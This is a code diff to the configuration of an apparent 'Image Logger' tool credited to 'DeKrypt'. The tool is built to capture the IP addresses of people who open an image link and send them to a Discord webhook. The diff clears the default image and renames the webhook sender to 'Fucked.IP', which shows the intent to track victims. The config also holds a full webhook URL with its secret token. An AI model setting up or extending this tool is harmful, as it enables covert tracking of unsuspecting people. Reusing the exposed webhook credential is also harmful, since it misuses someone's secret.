@@ -13,12 +13,12 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1328328582946099276/kKXXgnclL9aIjK8cNU4uh0eYkIAQmFmezw-33s8awKe_dxNzS8rUA_NH4OJcCCT_i5HL",
-    "image": "https://t3.ftcdn.net/jpg/04/80/24/48/360_F_480244891_2NZt8RUKCkPdbU7ACz5k1cUDjKvt6Lue", # You can also have a custom image by using a URL argument
+    "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Fucked.IP", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
